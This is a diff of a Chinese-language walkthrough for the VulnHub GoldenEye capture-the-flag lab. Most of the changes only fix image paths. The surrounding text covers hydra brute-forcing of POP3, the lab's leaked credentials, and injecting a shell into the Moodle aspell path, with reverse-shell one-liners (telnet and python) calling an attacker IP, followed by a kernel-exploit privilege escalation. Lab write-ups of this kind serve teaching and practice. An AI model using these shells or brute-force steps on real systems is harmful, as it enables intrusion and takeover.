@@ -1,6 +1,6 @@
 # 前言
 
-靶机：`goldeneye`，IP地址为`192.168.10.10`
+靶机：`goldeneye`，IP地址为`192.168.10.9`
 
 攻击：`kali`，IP地址为`192.168.10.2`
 
@@ -14,13 +14,13 @@
 
 因为是同一局域网下，所以采用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`，当然也可以使用`nmap`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\1.jpg)
+![](./pic/1.jpg)
 
 # 信息发现
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\2.jpg)
+![](./pic/2.jpg)
 
 开启了80端口`http`服务，以及邮件相关的两个服务
 
@@ -28,27 +28,27 @@
 
 访问80端口网站，这里是一个个字符像打字输出的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\3.jpg)
+![](./pic/3.jpg)
 
 访问给出的目录`/sev-home`，弹窗提示登录
 
 查看原始界面的源代码，发现整个`html`是由`js`代码编写的，直接访问这个`js`代码
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\5.jpg)
+![](./pic/5.jpg)
 
 查看这个`js`文件，其中给出名字`boris`以及经过编码的密码。还有一个女生的名字`natalya`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\6.jpg)
+![](./pic/6.jpg)
 
 这种编码为`html`编码，可自行百度，可通过工具或者在线解码平台进行解码
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\7.jpg)
+![](./pic/7.jpg)
 
 # 漏洞寻找
 
 密码为`InvincibleHack3r`，用上面两个名字进行登录测试，以`boris`和这个密码登录成功
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\8.jpg)
+![](./pic/8.jpg)
 
 网站中的话，大概就是让发送邮件到`goldeneye`管理员处，不行这里的话特别有游戏`hacker`的感觉，我觉得还是翻译一下比较好
 
@@ -57,7 +57,7 @@
 >请给一名合格的GNO主管发送电子邮件，以获取在线的 “黄金眼”操作员培训 ，从而成为“黄金眼”系统的管理员。
 >
 >记住，由于 隐蔽即安全非常有效，我们已将POP3服务配置在一个非常高的非默认端口上运行。
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\9.jpg)
+![](./pic/9.jpg)
 
 查看页面源代码，发现在最后面，有提到合格的管理员，就是上面的两个名字`boris`和`natalya`
 
@@ -67,7 +67,7 @@
 
 使用`nc`连接这个`pop3`，发现输入上面获取的密码进行测试，两个用户都对应不上，所以可能需要爆破
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\10.jpg)
+![](./pic/10.jpg)
 
 
 
@@ -89,15 +89,15 @@
 hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.10.9 pop3 -s 55007
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\11.jpg)
+![](./pic/11.jpg)
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\12.jpg)
+![](./pic/12.jpg)
 
 两组密码，先登录`boris`，然后登录成功，使用`list`发现三封邮件，使用`retr 1~3`查看内容，发现前两个都是内部人员的交流，并且无价值。
 
 在第三封邮件，出现内容，首先确定`boris`的邮箱，`boris@ubuntu`以及发送者的邮箱`alec@janus.boss`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\13.jpg)
+![](./pic/13.jpg)
 
 翻译上面的话，附件这里看不到
 
@@ -115,7 +115,7 @@ hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.10.9 pop3 -s 55007
 
 查看第二封邮件，发现内容很重要，与前面对应上了
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\14.jpg)
+![](./pic/14.jpg)
 
 翻译这个话，发现前面`janus`组织发送给`boris`中提到这个人`xenia`并且`janus`组织说过，`xenia`是其组织派去的`spy`
 
@@ -137,17 +137,17 @@ hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.10.9 pop3 -s 55007
 
 首先根据提示，绑定域名
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\15.jpg)
+![](./pic/15.jpg)
 
 访问提供的内部域网址`severnaya-station.com/gnocertdir`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\16.jpg)
+![](./pic/16.jpg)
 
 以上面邮件给的用户名`xenia`和密码`RCP90rulez!`登录即可
 
 最终只发现一个邮件，是`Dr Doak`发送的，并且其是主管
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\17.jpg)
+![](./pic/17.jpg)
 
 这里邮件信息并没有截图完整，放在下面吧
 
@@ -178,11 +178,11 @@ hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.10.9 pop3 -s 55007
 hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.10.9 pop3 -s 55007
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\18.jpg)
+![](./pic/18.jpg)
 
 密码`goat`，再次使用这个登录`pop3`服务器，使用`list`查看只有一封邮件，使用`retr`查看
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\19.jpg)
+![](./pic/19.jpg)
 
 这里是真的厉害，主管发送给`james`让其登录他的账号去登录刚刚的界面
 
@@ -196,7 +196,7 @@ hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.10.9 pop3 -s 55007
 
 以获取到的用户名`dr_doak`和密码`4England!`登录网站，发现存在一个隐私文件`s3cret.txt`，文件夹说是给`james`的，好嘛，这主管想要干什么，查看发现其中有一个图片地址
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\20.jpg)
+![](./pic/20.jpg)
 
 翻译这段话，说是这个网站的管理员凭证在这个图片这里
 
@@ -204,11 +204,11 @@ hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.10.9 pop3 -s 55007
 
 访问这个地址，发现提示说就在这
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\21.jpg)
+![](./pic/21.jpg)
 
 把这个图片下载到`kali`中，然后使用`exiftool`查看图片属性等，看有无隐藏信息，发现图片描述信息，经过编码处理，这里一眼`base64`，进行解码，发现字符`xWinter1995x!`，这个可能就是管理员`admin`的密码
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\22.jpg)
+![](./pic/22.jpg)
 
 以管理员`admin`和密码`xWinter1995x!`再次登录这个网站，发现成功
 
@@ -216,13 +216,13 @@ hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.10.9 pop3 -s 55007
 
 登陆后到处测试，发现在添加处，可以有检测字符拼写的操作
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\23.jpg)
+![](./pic/23.jpg)
 
 然后继续寻找，唉，真的是漫长啊，发现一个路径，根据提示来看，翻译一下
 
 > 要在编辑器中使用拼写检查功能，你的服务器上必须安装 aspell 0.50 或更高版本，并且你必须指定正确路径来访问 aspell 二进制文件。在 Unix/Linux 系统上，该路径通常是 /usr/bin/aspell，但也可能是其他路径。
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\24.jpg)
+![](./pic/24.jpg)
 
 猜测这个路径就是前面编辑器中的拼写检测所指向的路径，观察这个命令，感觉这个地方可以写入`webshell`
 
@@ -234,7 +234,7 @@ sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>
 
 在插件处，发现多个插件，其中有文本编辑的插件，打开设置，发现可以选择拼写引擎，默认的是`google spell`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\25.jpg)
+![](./pic/25.jpg)
 
 
 
@@ -256,7 +256,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 这里可以借助网站`https://forum.ywhack.com/reverse-shell/`生成，方便
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\26.jpg)
+![](./pic/26.jpg)
 
 # 提权
 
@@ -269,11 +269,11 @@ cat /etc/os-release
 uname -r
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\27.jpg)
+![](./pic/27.jpg)
 
 在`kali`中使用`searchsploit`搜索，发现`c`文件
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\28.jpg)
+![](./pic/28.jpg)
 
 那么在靶机测试安装了什么编译命令
 
@@ -282,23 +282,23 @@ gcc -v
 cc -v
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\29.jpg)
+![](./pic/29.jpg)
 
 那么先查看之前搜索到的`c`文件，发现其中还是经过`gcc`命令了，所以需要修改文件
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\30.jpg)
+![](./pic/30.jpg)
 
 利用`python`与`wget`下载到靶机，然后使用`cc`进行编译
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\31.jpg)
+![](./pic/31.jpg)
 
 这时候给予`exp`执行权限，并执行，即可发现提权成功
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\32.jpg)
+![](./pic/32.jpg)
 
 查看最终`flag`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\goldeneye靶场\pic\33.jpg)
+![](./pic/33.jpg)
 
 
 
